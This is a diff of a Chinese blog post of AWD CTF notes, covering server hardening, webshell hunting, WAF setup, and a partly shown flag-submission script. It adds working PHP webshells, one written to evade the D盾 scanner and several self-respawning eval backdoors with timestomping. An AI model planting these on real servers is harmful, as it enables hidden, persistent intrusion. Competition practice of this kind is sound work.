@@ -6,15 +6,15 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
 
 <link rel="shortcut icon" href="/images/icon.png" type="image/png" />
-<meta name="description" content="启动首先修改ssh密码 1passwd username 然后修改mysql密码 1show databases; 选择相应数据库 1use mysql; 修改数据库密码 1set password for root@localhost &#x3D; password(&#x27;Zhangnuot1anxiawudi_&#x27;); 源码备份打包目录 会将var目录整个打包 1tar -zcvf arc">
+<meta name="description" content="启动首先修改ssh密码 1passwd username 然后修改mysql密码 1show databases; 选择相应数据库 1use mysql; 修改数据库密码 1set password for root@localhost &#x3D; password(&#x27;d29zaGljYWliaQ&#x3D;&#x3D;&#x27;); 源码备份打包目录 会将var目录整个打包 1tar -zcvf archive">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AWD">
 <meta property="og:url" content="http://xxxkkk578.github.io/2024/04/11/AWD/index.html">
 <meta property="og:site_name" content="杂记">
-<meta property="og:description" content="启动首先修改ssh密码 1passwd username 然后修改mysql密码 1show databases; 选择相应数据库 1use mysql; 修改数据库密码 1set password for root@localhost &#x3D; password(&#x27;Zhangnuot1anxiawudi_&#x27;); 源码备份打包目录 会将var目录整个打包 1tar -zcvf arc">
+<meta property="og:description" content="启动首先修改ssh密码 1passwd username 然后修改mysql密码 1show databases; 选择相应数据库 1use mysql; 修改数据库密码 1set password for root@localhost &#x3D; password(&#x27;d29zaGljYWliaQ&#x3D;&#x3D;&#x27;); 源码备份打包目录 会将var目录整个打包 1tar -zcvf archive">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-04-11T07:36:16.000Z">
-<meta property="article:modified_time" content="2024-04-13T02:36:27.626Z">
+<meta property="article:modified_time" content="2024-04-21T06:53:28.108Z">
 <meta property="article:author" content="张岩">
 <meta property="article:tag" content="CTF,AWD">
 <meta name="twitter:card" content="summary">
@@ -23,15 +23,15 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1713081530256">
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1714040516114">
 
-<link rel="stylesheet" href="/css/style.css?v=1713081530256">
+<link rel="stylesheet" href="/css/style.css?v=1714040516114">
 
 
 
 
     
-        <link rel="stylesheet" href="/custom.css?v=1713081530256">
+        <link rel="stylesheet" href="/custom.css?v=1714040516114">
     
 
 
@@ -41,7 +41,7 @@
 <script src="/lib/lax.min.js" async></script>
 
 
-<script async src="/js/app.js?v=1713081530256"></script>
+<script async src="/js/app.js?v=1714040516114"></script>
 
  
 
@@ -144,7 +144,7 @@
 <p>选择相应数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use mysql;<br></code></pre></td></tr></table></figure>
 <p>修改数据库密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set password for root@localhost = password(&#x27;Zhangnuot1anxiawudi_&#x27;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set password for root@localhost = password(&#x27;d29zaGljYWliaQ==&#x27;);<br></code></pre></td></tr></table></figure>
 <p>源码备份<br>打包目录 会将var目录整个打包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tar -zcvf archive_name.tar.gz directory_to_compress<br></code></pre></td></tr></table></figure>
 <p>即</p>
@@ -202,9 +202,13 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netstat<br>ps -aux<br>netstat -apt<br></code></pre></td></tr></table></figure>
 <p>杀掉进程</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">kill -9 pid            //Linux上<br>taskkill /f /pid pid   //Windows上<br></code></pre></td></tr></table></figure>
+<p>总结</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ps -aux<br></code></pre></td></tr></table></figure>
+<p>之后 可多个pid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">kill -9 pid<br></code></pre></td></tr></table></figure>
 <p>搜索webshell文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件<br>find ./ -name &#x27;*.php&#x27; | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马<br>grep -r --include=*.php  &#x27;[^a-z]eval($_POST&#x27;  /var/www/html    //查包含关键字的php文件<br>find /var/www/html -type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串&quot;eval(&quot;的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看<br></code></pre></td></tr></table></figure>
-<p>查杀不死马 之后要重启服务</p>
+<p>查杀不死马 之后要重启服务 一键查杀</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ps -aux | grep www-data | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9<br></code></pre></td></tr></table></figure>
 <p>重启服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">service php-fpm restart<br></code></pre></td></tr></table></figure>
@@ -213,9 +217,173 @@
 <p>主要工具</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap<br>nessus<br>metasploit<br></code></pre></td></tr></table></figure>
 <p>常见漏洞poc及exp</p>
-<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">- You can start Nessus Scanner by typing /bin/systemctl start nessusd.service<br>- Then go to https://kali:8834/ to configure your scanner<br></code></pre></td></tr></table></figure>
+<h1 id="其余准备"><a href="#其余准备" class="headerlink" title="其余准备"></a>其余准备</h1><h2 id="kali准备测试网站"><a href="#kali准备测试网站" class="headerlink" title="kali准备测试网站"></a>kali准备测试网站</h2><p>安装apache服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo apt install apache2<br></code></pre></td></tr></table></figure>
+<p>然后启用服务即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">service apache2 start<br></code></pre></td></tr></table></figure>
+<p>然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">localhost<br></code></pre></td></tr></table></figure>
+<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">- You can start Nessus Scanner by typing /bin/systemctl start nessusd.service<br>- Then go to https://kali:8834/ to configure your scanner<br></code></pre></td></tr></table></figure>
 <p>输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/bin/systemctl start nessusd.service<br></code></pre></td></tr></table></figure>
+<p>启动方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">service nessus start<br></code></pre></td></tr></table></figure>
+<p>然后进入对应网页</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://kali:8834/<br></code></pre></td></tr></table></figure>
+<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><p>进入对应目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/nessus/sbin/ <br></code></pre></td></tr></table></figure>
+<p>查看当前用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./nessuscli lsuser<br></code></pre></td></tr></table></figure>
+<p>修改密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./nessuscli chpasswd root<br></code></pre></td></tr></table></figure>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>启动</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">service nessus start<br></code></pre></td></tr></table></figure>
+<p>常用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Host Discovery<br>Web Application Tests<br>WannaCry Ransomware (永恒之蓝)<br></code></pre></td></tr></table></figure>
+<h2 id="D盾"><a href="#D盾" class="headerlink" title="D盾"></a>D盾</h2><p>D盾只能在windows上用<br>必须是IIS网站环境<br>要想让其在linux上使用 需要使用ssh将linux的磁盘映射到windows上</p>
+<h3 id="sshfs的安装"><a href="#sshfs的安装" class="headerlink" title="sshfs的安装"></a>sshfs的安装</h3><p>先安装驱动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://github.com/winfsp/winfsp/releases/download/v1.12.22339/winfsp-1.12.22339.msi<br></code></pre></td></tr></table></figure>
+<p>再安装sshfs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://github.com/winfsp/sshfs-win/releases<br></code></pre></td></tr></table></figure>
+<p>图形化界面的sshfs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://github.com/evsar3/sshfs-win-manager/releases/download/v1.3.1/sshfs-win-manager-v1.3.1.zip<br></code></pre></td></tr></table></figure>
+<h3 id="D盾免杀"><a href="#D盾免杀" class="headerlink" title="D盾免杀"></a>D盾免杀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Chello</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">constructStr</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;ass&#x27;</span>;<br>            <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;ert&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$str</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __destruct() method.</span><br>            <span class="hljs-variable">$temp</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">constructStr</span>();<br>            <span class="hljs-variable">$temp</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chello</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>这里我们选择AoiAWD 是一个由Aodzip（安恒信息 海特实验室研究员、HAC战队成员）维护的一个针对于CTF AWD模式的开源项目。<br>这里我们使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/NonupleBroken/AWD_PHP_WAF<br></code></pre></td></tr></table></figure>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>ssh上传本地文件 使用scp命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp /var/www/html/shell.php kali@:/var/www/html <br></code></pre></td></tr></table></figure>
+<p>首先将waf文件夹复制到网站根目录下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp -r waffffff /var/www/html<br></code></pre></td></tr></table></figure>
+<p>上waf 在网站根目录下运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/g&quot;<br></code></pre></td></tr></table></figure>
+<p>然后访问web目录下的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">waffffff/admin.php?password+Y1nghanshi_<br></code></pre></td></tr></table></figure>
+<p>上waf</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -path CTF_WAF.php -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\&quot;\/var\/www\/html\/CTF_WAF.php\&quot;);/g&quot;<br></code></pre></td></tr></table></figure>
+<p>waf 加在&lt;php 后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;/var/www/html/CTF_WAF.php&quot;</span>); <br></code></pre></td></tr></table></figure>
+<p>修改php文件上WAF</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gedit /etc/php/8.2/cli/php.ini<br></code></pre></td></tr></table></figure>
+<p>找到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto_append_file = /var/www/html/waffffff/waf.php<br></code></pre></td></tr></table></figure>
+<p>在后面加上WAF的绝对路径<br>上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo find /var/www/html/ -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php /&lt;?php\nrequire_once(&#x27;\/tmp\/waf.php&#x27;);\n/g&quot;<br></code></pre></td></tr></table></figure>
+<p>但依然没有上成<br>试试别的方法<br>在php页面的代码中加入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;/tmp/waf.php&quot;</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log 发现报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[Wed Apr 17 20:46:09.319409 2024] [php:error] [pid 264855] [client 127.0.0.1:40722] PHP Fatal error:  Uncaught Error: Failed opening required &#x27;/tmp/waf.php&#x27; (include_path=&#x27;.:/usr/share/php&#x27;) in /var/www/html/test.php:2\nStack trace:\n#0 &#123;main&#125;\n  thrown in /var/www/html/test.php on line 2<br></code></pre></td></tr></table></figure>
+<p>给当前文件夹权限www-date</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chown -R www-data:www-data /var/www/html<br></code></pre></td></tr></table></figure>
+<p>考虑到文件权限问题 我们还是把waf移动到了&#x2F;var&#x2F;www&#x2F;html目录下 这次页面可以正常打开了 但是waf返回的内容还是空的<br>通过接下来的测试<br>发现访问网页并不会触发waf 但是在命令行中使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php test.php<br></code></pre></td></tr></table></figure>
+<p>时 能够触发<br>接下来修改php文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gedit /etc/php/8.2/cli/php.ini<br></code></pre></td></tr></table></figure>
+<p>修改下列值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto_prepend_file = /var/www/html/waf.php<br></code></pre></td></tr></table></figure>
+<p>然后重启apache服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">service apache2 restart<br></code></pre></td></tr></table></figure>
+<p>之后就成功了！<br>我的上waf方法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sed -i &quot;1i&lt;?php\nrequire_once(\&quot;\/var\/www\/html\/waf_classify.php\&quot;)\n?&gt;&quot; *<br></code></pre></td></tr></table></figure>
+<p>如果想要下waf 本质上就是删除三行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sed -i &quot;1,3d&quot; *<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><h2 id="0、最基本的"><a href="#0、最基本的" class="headerlink" title="0、最基本的"></a>0、最基本的</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure>
+
+<h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;./.index.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;2b21d21331f8e81244ee754f82d483fe&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;<br><span class="hljs-comment">//pass=kkecho 马儿用法：shell.php?pass=kkecho&amp;a=command</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>	<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>	<span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>常规不死马，先删除自身，不断生成 <code>.index.php</code> 文件<br>新建同名文件夹可以防御</p>
+<h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;2b21d21331f8e81244ee754f82d483fe&quot;)&#123;@eval($_REQUEST[&#x27;</span>cmd<span class="hljs-string">&#x27;]);&#125; ?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#passwd=kkecho</span><br><span class="hljs-comment">#POST传参：passwd=kkecho&amp;a=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure>
+<p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入<a target="_blank" rel="noopener" href="http://xxx/shell2.php?pass=y0range857%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%93%BE%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E7%94%B1%E4%BA%8Epass%E6%98%AFmd5%E5%8A%A0%E5%AF%86%E5%BE%88%E9%9A%BE%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E9%9A%90%E8%94%BD,md5%E5%80%BC%E5%8F%AF%E4%BB%A5%E9%9A%8F%E6%84%8F%E5%AE%9A%E4%B9%89%E3%80%82">http://xxx/shell2.php?pass=y0range857的路径，就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。</a></p>
+<h2 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.login.php&#x27;</span>;<br><span class="hljs-variable">$file1</span> = <span class="hljs-string">&#x27;/admin/.register.php&#x27;</span>; <br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;2b21d21331f8e81244ee754f82d483fe&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file1</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问at.php后会生成at2.php<br>然后访问如下即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">url/upload/at2.php?passwd=obse007&amp;at=system(&#x27;ls&#x27;);<br></code></pre></td></tr></table></figure>
+<h2 id="flag提交脚本"><a href="#flag提交脚本" class="headerlink" title="flag提交脚本"></a>flag提交脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://ip:&quot;</span><br>url1 = <span class="hljs-string">&quot;&quot;</span><br>shell = <span class="hljs-string">&quot;/includes/config.php?d=system&quot;</span><br>passwd = <span class="hljs-string">&quot;c&quot;</span> <br>port = <span class="hljs-string">&quot;80&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;cat /flag&#x27;</span>&#125;<br><br>flag_server = <span class="hljs-string">&quot;http://flag_server/flag_file.php?token=%s&amp;flag=%s&quot;</span><br>teamtoken = <span class="hljs-string">&quot;team1&quot;</span><br><br><span 